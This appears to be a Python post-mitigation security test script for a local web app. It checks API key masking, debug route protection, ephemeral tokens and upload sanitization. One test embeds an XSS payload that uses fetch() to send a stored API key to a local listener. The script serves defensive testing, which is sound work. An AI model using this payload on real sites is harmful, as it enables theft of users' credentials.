import requests
import threading
import time
import json
from bs4 import BeautifulSoup
from http.server import HTTPServer, BaseHTTPRequestHandler

BASE = 'http://127.0.0.1:5000'

# Start server

def run_app():
    import app as appmod
    app = appmod.app
    app.run(debug=False, use_reloader=False)


def start_server_in_thread():
    t = threading.Thread(target=run_app, daemon=True)
    t.start()
    time.sleep(1)
    return t

class ExfilServer(BaseHTTPRequestHandler):
    logs = []
    def do_GET(self):
        ExfilServer.logs.append(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')


# 1) Check that dashboard doesn't expose full API key

def test_api_key_masked():
    start_server_in_thread()
    r = requests.get(BASE + '/dashboard')
    assert r.status_code == 200
    soup = BeautifulSoup(r.text, 'html.parser')
    api_span = soup.find(id='apiKey')
    api = api_span.get_text().strip()
    assert not api.startswith('POST_PATCH_API_KEY')
    assert api.startswith('****')
    out = {'result': 'api_key_masked', 'value': api}
    print(json.dumps(out))


# 2) JS should not contain embedded API key

def test_js_no_api_key():
    r = requests.get(BASE + '/static/js/app.js')
    assert 'POST_PATCH_API_KEY' not in r.text
    out = {'result': 'js_no_api_key', 'msg': 'no api key found in JS'}
    print(json.dumps(out))


# 3) XSS payload should not exfiltrate

def test_xss_file_sanitized():
    server = HTTPServer(('127.0.0.1', 8002), ExfilServer)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    payload = "<script>fetch('http://127.0.0.1:8002/?q='+localStorage.getItem('apiKey'))</script>"
    files = {'file': ('exploit.html', payload)}
    r = requests.post(BASE + '/preview', files=files)
    assert r.status_code == 200
    time.sleep(1)
    server.shutdown()
    assert not any('POST_PATCH_API_KEY' in p for p in ExfilServer.logs)
    out = {'result': 'xss_sanitized', 'exfil_logs': ExfilServer.logs}
    print(json.dumps(out))


# 4) Debug route should be denied for normal users

def test_debug_protected():
    r = requests.get(BASE + '/debug')
    assert r.status_code == 403
    out = {'result': 'debug_protected', 'status': r.status_code}
    print(json.dumps(out))


# 5) Ensure /api/use requires ephemeral token and cannot be called with old key

def test_api_requires_token():
    # Attempt with old key
    r = requests.get(BASE + '/api/use', headers={'X-API-KEY': 'POST_PATCH_API_KEY_XYZ987654'})
    assert r.status_code == 403
    # Get ephemeral token
    tkn = requests.post(BASE + '/api/token').json().get('token')
    r2 = requests.get(BASE + '/api/use', headers={'X-Ephemeral-Token': tkn})
    assert r2.status_code == 200
    out = {'result': 'api_token_used', 'token': tkn}
    print(json.dumps(out))


if __name__ == '__main__':
    report = {'vulnerabilities': []}
    tests = [
        ('api_key_masked', test_api_key_masked),
        ('js_no_api_key', test_js_no_api_key),
        ('xss_sanitized', test_xss_file_sanitized),
        ('debug_protected', test_debug_protected),
        ('api_token_required', test_api_requires_token)
    ]

    for name, t in tests:
        try:
            t()
            status = 'passed'
        except AssertionError as e:
            status = 'failed'
        report['vulnerabilities'].append({'test': name, 'status': status})

    with open('post_mitigation_report.json', 'w') as fh:
        fh.write(json.dumps(report, indent=2))

    print(json.dumps({'report': 'post-mitigation tests complete', 'report_file': 'post_mitigation_report.json'}))
